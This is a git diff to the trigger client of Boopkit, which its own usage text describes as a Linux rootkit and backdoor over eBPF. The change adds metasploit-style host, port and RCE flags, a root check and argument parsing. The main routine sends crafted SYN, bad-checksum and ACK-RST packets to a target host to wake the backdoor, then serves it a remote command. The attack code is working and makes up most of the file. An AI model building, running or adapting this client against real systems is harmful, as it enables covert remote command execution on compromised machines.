@@ -76,6 +76,67 @@ int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
   return 0;
 }
 
+void usage() {
+  printf("Boopkit version: %s\n", VERSION);
+  printf("Linux rootkit and backdoor over eBPF.\n");
+  printf("Author: Kris Nóva <kris@nivenly.com>\n");
+  printf("\n");
+  printf("Usage: boopkit-boop [options]\n");
+  printf("\n");
+  printf("Options:\n");
+//  printf("-h, help           Display help and usage for boopkit.\n");
+//  printf("-x, ignore         Source addresses to reject triggers from.\n");
+  printf("\n");
+  exit(0);
+}
+
+
+
+// config is the configuration options for the program
+struct config {
+  // metasploit inspired flags
+  char rhost[INET_ADDRSTRLEN];
+  char rport[MAX_PORT_STR];
+  char lhost[INET_ADDRSTRLEN];
+  char lport[MAX_PORT_STR];
+  char rce[MAX_RCE_SIZE];
+} cfg;
+
+// clisetup will initialize the config struct for the program
+void clisetup(int argc, char **argv) {
+  for (int i = 0; i < argc; i++) {
+    if (strncmp(argv[i], "-lport", 32) == 0 && argc >= i + 1){
+      strncpy(cfg.lport, argv[i + 1], MAX_PORT_STR);
+    }
+    if (strncmp(argv[i], "-rport", 32) == 0 && argc >= i + 1){
+      strncpy(cfg.rport, argv[i + 1], MAX_PORT_STR);
+    }
+    if (strncmp(argv[i], "-lhost", INET_ADDRSTRLEN) == 0 && argc >= i + 1){
+      strncpy(cfg.lhost, argv[i + 1], MAX_PORT_STR);
+    }
+    if (strncmp(argv[i], "-rhost", INET_ADDRSTRLEN) == 0 && argc >= i + 1){
+      strncpy(cfg.rhost, argv[i + 1], MAX_PORT_STR);
+    }
+    if (argv[i][0] == '-') {
+      switch (argv[i][1]) {
+      case 'h':
+        usage();
+        break;
+      }
+    }
+  }
+}
+
+void rootcheck(int argc, char **argv) {
+  long luid = (long)getuid();
+  printf("  -> getuid() : %ld\n", luid);
+  if (luid != 0) {
+    printf("  XX Invalid UID.\n");
+    printf("  XX Permission denied.\n");
+    exit(1);
+  }
+}
+
 // [trigger] <source-ip> <target-ip> <target-port>
 //
 // My research shows that with Linux 5.17 kernels
@@ -87,13 +148,16 @@ int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
 // a boop!
 //
 int main(int argc, char **argv) {
-  char *rce = "ls -la";
+  asciiheader();
+  rootcheck(argc, argv);
+  clisetup(argc, argv);
   srand(time(NULL));
-  if (argc != 4) {
-    printf("usage: %s <source-ip> <target-ip> <port>\n", argv[0]);
-    return 1;
-  }
 
+//  printf("lport: %s\n", cfg.lport);
+//  printf("lhost: %s\n", cfg.lhost);
+//  printf("rport: %s\n", cfg.rport);
+//  printf("rhost: %s\n", cfg.rhost);
+  
   // [Vars]
   // one and oneval used for various socket options below.
   int one = 1;
@@ -103,8 +167,8 @@ int main(int argc, char **argv) {
   // Configure daddr fields sin_port, sin_addr, sin_family
   struct sockaddr_in daddr;
   daddr.sin_family = AF_INET;
-  daddr.sin_port = htons(atoi(argv[3]));
-  if (inet_pton(AF_INET, argv[2], &daddr.sin_addr) != 1) {
+  daddr.sin_port = htons(atoi(cfg.rport));
+  if (inet_pton(AF_INET, cfg.rhost, &daddr.sin_addr) != 1) {
     printf("Destination IP configuration failed\n");
     return 1;
   }
@@ -114,7 +178,7 @@ int main(int argc, char **argv) {
   struct sockaddr_in saddr;
   saddr.sin_family = AF_INET;
   saddr.sin_port = htons(rand() % 65535);  // random client port
-  if (inet_pton(AF_INET, argv[1], &saddr.sin_addr) != 1) {
+  if (inet_pton(AF_INET, cfg.lhost, &saddr.sin_addr) != 1) {
     printf("Source IP configuration failed\n");
     return 1;
   }
@@ -167,7 +231,7 @@ int main(int argc, char **argv) {
     printf("Unable to send bad checksum SYN packet over SOCK_RAW.\n");
     return 2;
   }
-  printf("SYN      [bad checksum] -> %s:%s %d bytes\n", argv[2], argv[3], sent);
+  printf("SYN      [bad checksum] -> %s:%s %d bytes\n", cfg.rhost, cfg.rport, sent);
   close(sock1);
   // ===========================================================================
 
@@ -189,7 +253,7 @@ int main(int argc, char **argv) {
     printf("Connection SOCK_STREAM refused.\n");
     return 2;
   }
-  printf("CONNECT  [    okay    ] -> %s:%s\n", argv[2], argv[3]);
+  printf("CONNECT  [    okay    ] -> %s:%s\n", cfg.rhost, cfg.rport);
   close(sock2);
   // ===========================================================================
 
@@ -222,15 +286,15 @@ int main(int argc, char **argv) {
     printf("Unable to send RST over SOCK_STREAM.\n");
     return 2;
   }
-  printf("SYN      [    okay    ] -> %d bytes to %s:%s\n", sent, argv[2],
-         argv[3]);
+  printf("SYN      [    okay    ] -> %d bytes to %s:%s\n", sent, cfg.rhost,
+         cfg.rport);
   char recvbuf[DATAGRAM_LEN];
   int received = receive_from(sock3, recvbuf, sizeof(recvbuf), &saddr);
   if (received <= 0) {
     printf("Unable to receive SYN-ACK over SOCK_STREAM.\n");
     return 3;
   }
-  printf("SYN-ACK  [    okay    ] <- %d bytes from %s\n", received, argv[2]);
+  printf("SYN-ACK  [    okay    ] <- %d bytes from %s\n", received, cfg.rhost);
   uint32_t seq_num, ack_num;
   read_seq_and_ack(recvbuf, &seq_num, &ack_num);
   int new_seq_num = seq_num + 1;
@@ -241,13 +305,13 @@ int main(int argc, char **argv) {
     printf("Unable to send ACK-RST over SOCK_STREAM.\n");
     return 2;
   }
-  printf("ACK-RST  [    okay    ] -> %d bytes to %s:%s\n", sent, argv[2],
-         argv[3]);
+  printf("ACK-RST  [    okay    ] -> %d bytes to %s:%s\n", sent, cfg.rhost,
+         cfg.rport);
   close(sock3);
   // ===========================================================================
 
   int errno;
-  errno = serverce(saddrstr, rce);
+  errno = serverce(saddrstr, cfg.rce);
   if (errno != 0) {
     printf(" Error serving RCE!\n");
   }
